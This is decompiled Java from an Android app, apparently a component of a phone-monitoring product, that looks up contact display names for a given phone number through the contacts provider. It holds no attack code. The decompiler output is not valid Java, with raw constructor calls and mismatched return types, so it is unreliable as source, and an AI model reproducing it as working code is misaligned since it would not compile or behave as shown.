package com.vvt.h;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.provider.ContactsContract.Contacts;
import android.telephony.PhoneNumberUtils;
import com.vvt.ak.a;
import java.util.HashSet;
import java.util.Iterator;

public class f
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  
  private static Uri a(String paramString)
  {
    int i = c();
    int j = 4;
    if (i > j)
    {
      boolean bool = g.a();
      if (!bool) {}
    }
    for (Uri localUri = g.b();; localUri = ContactsContract.Contacts.CONTENT_FILTER_URI)
    {
      String str = Uri.encode(paramString);
      return Uri.withAppendedPath(localUri, str);
    }
  }
  
  public static boolean a(ContentResolver paramContentResolver, String paramString)
  {
    for (;;)
    {
      try
      {
        Uri localUri = a(paramString);
        localObject1 = paramContentResolver;
        localObject1 = paramContentResolver.query(localUri, null, null, null, null);
        i = ((Cursor)localObject1).getCount();
        if (i <= 0) {
          continue;
        }
        i = 1;
      }
      catch (Exception localException)
      {
        Object localObject1;
        int i;
        boolean bool = b;
        if (!bool) {
          continue;
        }
        bool = false;
        Object localObject2 = null;
        continue;
      }
      return i;
      bool = false;
      localObject1 = null;
    }
  }
  
  private static String b()
  {
    int i = c();
    int j = 4;
    if (i > j)
    {
      boolean bool = g.a();
      if (!bool) {}
    }
    for (String str = "display_name";; str = "name") {
      return str;
    }
  }
  
  public static String b(ContentResolver paramContentResolver, String paramString)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = PhoneNumberUtils.isWellFormedSmsAddress(paramString);
    if (!bool2)
    {
      bool2 = a;
      if (!bool2) {}
    }
    for (;;)
    {
      return (String)localObject1;
      String str = b();
      Object localObject2 = a(paramString);
      Object localObject3 = paramContentResolver;
      localObject3 = paramContentResolver.query((Uri)localObject2, null, null, null, null);
      localObject2 = new java/util/HashSet;
      ((HashSet)localObject2).<init>();
      if (localObject3 != null)
      {
        for (;;)
        {
          bool1 = ((Cursor)localObject3).moveToNext();
          if (!bool1) {
            break;
          }
          int i = ((Cursor)localObject3).getColumnIndex(str);
          localObject1 = ((Cursor)localObject3).getString(i);
          ((HashSet)localObject2).add(localObject1);
        }
        ((Cursor)localObject3).close();
      }
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = ((HashSet)localObject2).iterator();
      for (;;)
      {
        bool2 = ((Iterator)localObject2).hasNext();
        if (!bool2) {
          break;
        }
        int j = ((StringBuilder)localObject1).length();
        if (j > 0)
        {
          localObject3 = "; ";
          ((StringBuilder)localObject1).append((String)localObject3);
        }
        localObject3 = (String)((Iterator)localObject2).next();
        ((StringBuilder)localObject1).append((String)localObject3);
      }
      localObject1 = ((StringBuilder)localObject1).toString();
      boolean bool3 = a;
      if (bool3) {}
      bool3 = a;
      if (!bool3) {}
    }
  }
  
  private static int c()
  {
    int i = 0;
    try
    {
      String str = Build.VERSION.SDK;
      i = Integer.parseInt(str);
    }
    catch (NumberFormatException localNumberFormatException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
    return i;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/AppEngine1/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */